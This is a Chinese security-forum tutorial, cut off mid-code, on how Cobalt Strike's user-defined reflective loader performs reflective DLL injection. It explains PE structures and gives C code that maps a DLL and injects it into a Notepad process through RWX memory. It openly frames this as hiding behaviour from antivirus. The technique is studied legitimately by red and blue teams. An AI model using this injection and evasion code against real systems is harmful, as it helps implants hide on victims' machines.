---
title: Cobalt Strike特征消除第三篇:通过UDRL学习RDI
url: https://forum.butian.net/share/4323
source: 奇安信攻防社区
date: 2025-05-16
fetch_date: 2025-10-06T22:23:16.914490
---

# Cobalt Strike特征消除第三篇:通过UDRL学习RDI

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### Cobalt Strike特征消除第三篇:通过UDRL学习RDI

* [安全工具](https://forum.butian.net/topic/53)

本文将介绍Cobalt Strike(下文简称CS)的UDRL(User Defined Reflective Loader，即用户自定义反射加载器)的RDI(Reflective Dll Inject，即反射dll注入)的实现。CS的UDRL是前置式的RDI，本文主要包括反射dll加载器的代码实现和反射dll的代码实现两大部分，我会尽量以相似且精简的代码去告诉大家CS的UDRL是怎么工作的和它的代码是怎么实现的。

前言
==
大家好，我是r0leG3n7。本文将介绍Cobalt Strike(下文简称CS)的UDRL(User Defined Reflective Loader，即用户自定义反射加载器)的RDI(Reflective Dll Inject，即反射dll注入)的实现。CS的UDRL是前置式的RDI，本文主要包括反射dll加载器的代码实现和反射dll的代码实现两大部分，我会尽量以相似且精简的代码去告诉大家CS的UDRL是怎么工作的和它的代码是怎么实现的。通过本文的学习，你可以了解到CS这款C2框架在进行dll注入时是如何隐藏一些敏感行为或特征来规避杀软的检测。如有任何错误和不足欢迎各位师傅指正，转载请注明文章出处。
基础知识
====
本文涉及大量的PE文件结构知识，这里只介绍下面代码可能会用到的PE知识点，如果对PE文件结构不熟建议先去学习或者复习一下PE文件结构，否则下面即使我讲得再细你可能也会看得难受，熟悉PE文件结构的可以跳过本节直接从下一节开始看。
基址与偏移
-----
### 基址
程序的真正入口地址=程序的加载地址（基址）+ PE扩展头(OptionalHeader)的AddressOfEntryPoint。一般来说，基址是PE扩展头中的ImageBase，但实际上基址是程序运行时随机分配的。（可以解决ImageBase内存镜像基址冲突问题，如果多个exe或dll的都用相同ImageBase作为基址，程序就无法运行了）
可以通过xdbg64中的内存分布，找到对应exe，右键点击，将内存转存到文件，找到程序的加载地址（基址）。
![](https://cdn.nlark.com/yuque/0/2025/png/27682735/1742443440435-821196db-96f6-46f6-bffe-61698a80e3cc.png)
### 相对虚拟地址
相对虚拟地址RVA(relative virtual address),PE文件加载进内存后的相对于基址的偏移地址。
### 文件偏移
文件偏移或者说文件地址(FA)，是数据在文件中的实际地址，通常为连续存储。
数据文件偏移地址=节表文件偏移地址(PointerToRawData)+节内偏移地址
节内偏移（内存中的偏移） = 数据RVA - 节表内存偏移地址(SectionHeader的VirtualAddress）
如果数据RVA大于节表内存偏移地址且节内偏移不大于SectionHeader的Misc.VirtualSize，证明该数据已经初始化在该节表内。
### 虚拟地址
VA(virtual address),PE文件加载进内存后的虚拟地址，虚拟地址(VA)由基址和相对虚拟地址相加得到，虚拟地址通常不是连续存储。
VA=基址+相对虚拟地址(RVA)
文件对齐与内存对齐
---------
内存对齐和文件对齐是PE文件设计中“空间换时间”和“时间换空间”的典型权衡。文件对齐优化存储效率，而内存对齐优化运行性能，两者共同确保程序在磁盘和内存中的高效表现。
### 文件对齐
PE文件在磁盘上存储时，每个段的起始位置必须是 文件对齐值(PE文件扩展头的FileAlignment) 的整数倍。对齐值通常为 0x200（512字节），与磁盘扇区大小一致。
### 内存对齐
当PE文件被加载到内存时，每个段（Section，如.text、.data等）的起始地址必须是 内存对齐值(PE文件扩展头的SectionAlignment) 的整数倍。对齐值通常为 0x1000（4096字节，即4KB），与操作系统的内存分页大小一致。
重定位表
----
重定位表的作用是当程序无法加载到预设的基址（`ImageBase`）时，修正代码中的绝对地址。重定位表结构如下:
```php
typedef struct \_IMAGE\_BASE\_RELOCATION {
DWORD VirtualAddress; //与数据目录中重定位表的 VirtualAddress不同，这个表示当前重定位块对应的内存页的 RVA
DWORD SizeOfBlock;
} IMAGE\_BASE\_RELOCATION;
typedef IMAGE\_BASE\_RELOCATION UNALIGNED \* PIMAGE\_BASE\_RELOCATION;
```
\*\*重定位表由多个重定位块（Block）构成，每个块包含一个头部和一组重定位项\*\*。重定位表的作用是当PE文件无法加载到预设的基地址（ImageBase）时，调整代码中的绝对地址。每个重定位块对应一个内存页，里面包含多个重定位项。每个重定位项的类型不同，告诉加载器如何修正地址。
### 重定位项
重定位项结构体如下，Type告诉加载器如何修正地址，Offset告诉加载器修正地址的位置。
```php
typedef struct \_RELOC\_ENTRY {
uint16\_t Offset : 12; // 低12位表示偏移
uint16\_t Type : 4; // 高4位表示类型，指示如何执行重定位
} RELOC\_ENTRY;
```
![](https://cdn.nlark.com/yuque/0/2025/png/27682735/1742895815441-3d546f86-5c06-4cd4-b314-72d51a309777.png)
Type类型
```php
#define IMAGE\_REL\_BASED\_ABSOLUTE 0 //空操作：用于对齐填充，无需修正。
#define IMAGE\_REL\_BASED\_HIGH 1 //高位修正：修正地址的高16位
#define IMAGE\_REL\_BASED\_LOW 2 //低位修正：修正地址的低16位
#define IMAGE\_REL\_BASED\_HIGHLOW 3 //全32位修正：需修正整个32位地址（32位PE文件的标准类型）
#define IMAGE\_REL\_BASED\_HIGHADJ 4
#define IMAGE\_REL\_BASED\_MACHINE\_SPECIFIC\_5 5
#define IMAGE\_REL\_BASED\_RESERVED 6
#define IMAGE\_REL\_BASED\_MACHINE\_SPECIFIC\_7 7
#define IMAGE\_REL\_BASED\_MACHINE\_SPECIFIC\_8 8
#define IMAGE\_REL\_BASED\_MACHINE\_SPECIFIC\_9 9
#define IMAGE\_REL\_BASED\_DIR64 10 //全64位修正：需修正整个64位地址
```
导入表
---
导入表明确列出程序运行所需的DLL和函数，如User32.dll的MessageBox等。在程序加载时，操作系统（加载器）会根据导入表的信息，将DLL加载到内存，并填充函数的实际地址到导入地址表（IAT, Import Address Table）中，供程序调用。导入表由导入目录表（IMAGE\\_IMPORT\\_DESCRIPTOR数组）、IAT和INT组成，每个被导入的DLL对应一个IMAGE\\_IMPORT\\_DESCRIPTOR结构，数组以全零结构结束。
```php
typedef struct \_IMAGE\_IMPORT\_DESCRIPTOR {
union {
DWORD Characteristics;
DWORD OriginalFirstThunk; //指向 INT（Import Name Table） 的RVA，存储函数名称或序号（在文件中只读）
} DUMMYUNIONNAME;
DWORD TimeDateStamp;
DWORD ForwarderChain;
DWORD Name;
DWORD FirstThunk; //指向 IAT（Import Address Table）的RVA，加载时会被替换为实际函数地址
} IMAGE\_IMPORT\_DESCRIPTOR;
typedef IMAGE\_IMPORT\_DESCRIPTOR UNALIGNED \*PIMAGE\_IMPORT\_DESCRIPTOR;
```
导入表在PE文件加载前后的变化:
PE文件加载前
![](https://cdn.nlark.com/yuque/0/2025/png/27682735/1745146235532-a7701e87-dc7a-4156-8600-3f6b9ba0901b.png)
PE文件加载后
![](https://cdn.nlark.com/yuque/0/2025/png/27682735/1745146293298-da0e6ca6-6018-4fbd-b097-98d77f14f0c8.png)
### INT
INT（Import Name Table）即名称导入表，INT的作用是存储函数名称或序号（未加载时的原始数据）,由连续的IMAGE\\_THUNK\\_DATA64（64位）或IMAGE\\_THUNK\\_DATA32（32位）结构体组成，最后一个项为全零。INT通常由IMAGE\\_IMPORT\\_DESCRIPTOR结构中的OriginalFirstThunk字段指向。
```php
typedef struct \_IMAGE\_THUNK\_DATA32 {
union {
DWORD ForwarderString;
DWORD Function; // 函数地址（加载后）
DWORD Ordinal; // 按序号导入时的高位标志 + 序号
DWORD AddressOfData; // PIMAGE\_IMPORT\_BY\_NAME
} u1;
} IMAGE\_THUNK\_DATA32;
```
按名称导入：u1.AddressOfData指向IMAGE\\_IMPORT\\_BY\\_NAME结构的RVA。
```php
typedef struct \_IMAGE\_IMPORT\_BY\_NAME {
WORD Hint; // 导出表中的序号（可选）
CHAR Name[1]; // 以NULL结尾的函数名称字符串
} IMAGE\_IMPORT\_BY\_NAME;
```
按序号导入：u1.Ordinal的最高位为1（IMAGE\\_ORDINAL\\_FLAG64），低16位为序号。
### IAT
IAT(Import Address Table)即导入地址表。
作用：在文件加载前与INT内容相同，加载后被替换为实际函数地址。
位置：由FirstThunk字段指向的RVA。
运行时修改：Windows加载器将IAT中的每个条目替换为真实的函数地址。
NtFlushInstructionCache
-----------------------
用于刷新指定进程的指令缓存。该函数的主要作用是清除指定进程中的指令缓存，以确保新的指令代码能够被正确执行。
```php
NTSTATUS NtFlushInstructionCache(
HANDLE ProcessHandle, //进程句柄，指定要刷新的进程。
PVOID BaseAddress, //要刷新的指令缓存的起始地址。
SIZE\_T Length //要刷新的指令缓存的长度
);
```
反射dll加载器
========
反射dll加载器主要作用是将反射dll注入到远程进程并让其自己执行其中的恶意代码，一般好的反射dll加载器是与反射dll一一对应的，这样能增强反射dll的沙箱对抗能力，如果不是对应的反射dll加载器加载该反射dll，程序就会报找不到对应的栈帧错误而退出。反射dll加载器的实现其实比较简单，核心代码部分主要是提取反射dll中的反射dll加载函数并为其创建远程线程执行。反射dll加载器大致执行流程如下图:
![](https://cdn.nlark.com/yuque/0/2025/png/27682735/1745327475235-66da2251-cd88-46da-9234-45bcc19eca1a.png)
读取dll文件并映射进内存
-------------
反射dll加载器读取反射dll文件的方式一般分为两种，第一种是直接读取dll文件并以文件对齐的形式映射进内存。第二种是直接读取dll文件并以内存对齐的形式映射进内存(CreateFileMapping的第三个参数加上SEC\\_IMAGE)；或先以文件对齐的形式映射进内存,再通过遍历各个节表VirtualAddress和PointerToRawData并使用内存复制函数将PE文件中节表文件偏移的数据复制到对应的虚拟地址，手动展开节表进行内存对齐。这里我选择第一种方式，然后加载反射dll的时候让反射dll自己去展开节表进行内存对齐。这里需要注意的是如果想让反射dll的函数能够在内存中正确执行就必须做好内存对齐。
```php
//定义需要加载的dll文件路径
const char\* peFilePath = "ReflectDll\_x64\_Dll\_New.dll";
//读取文件，创建文件句柄
HANDLE hFile = CreateFileA(peFilePath, GENERIC\_READ, FILE\_SHARE\_READ, NULL, OPEN\_EXISTING, FILE\_ATTRIBUTE\_NORMAL, NULL);
if (hFile == INVALID\_HANDLE\_VALUE) {
printf("Failed to open PE file\n");
return 0;
}
// 获取文件大小
DWORD fileSize = GetFileSize(hFile, NULL);
// 创建文件映射
HANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE\_READONLY, 0, 0, NULL); //如果需要将内存对齐以后的dll映射进内存，需要加上SEC\_IMAGE
if (hMapping == NULL) {
printf("Failed to create file mapping\n");
CloseHandle(hFile);
return 0;
}
// 创建映射视图
LPVOID fileBase = MapViewOfFile(hMapping, FILE\_MAP\_READ, 0, 0, 0);
if (fileBase == NULL) {
printf("Failed to create file view\n");
CloseHandle(hMapping);
CloseHandle(hFile);
return 0;
}
```
将dll文件数据注入远程进程
--------------
这里的示例是将反射dll注入到系统中的Notepad进程并执行恶意代码。需要注意的是我这里不仅注入了反射dll的文件对齐后的数据，我还注入了五个字节的数据来定位反射dll的基址。
```php
//自定义五个字节的数据，方便到时候定位反射dll的基址
const char HEADER[5] = { 0x1a, 0x1b, 0x1c, 0x2d, 0xc1 };
const size\_t HEADER\_SIZE = 5 \* sizeof(CHAR);
const wchar\_t\* targetPname = L"Notepad.exe";
//获取远程进程PID
DWORD targetPid = FindProcPid(targetPname);
//获取远程进程句柄
HANDLE targetProcessHandle = OpenProcess(PROCESS\_ALL\_ACCESS, FALSE, targetPid);
if (targetProcessHandle == NULL)
{
printf("failed to open target process!\n");
return 0;
}
//为远程进程分配内存
PBYTE startAddress = (PBYTE)VirtualAllocEx(targetProcessHandle, NULL, fileSize +HEADER\_SIZE, MEM\_RESERVE | MEM\_COMMIT, PAGE\_EXECUTE\_READWRITE);
if (startAddr...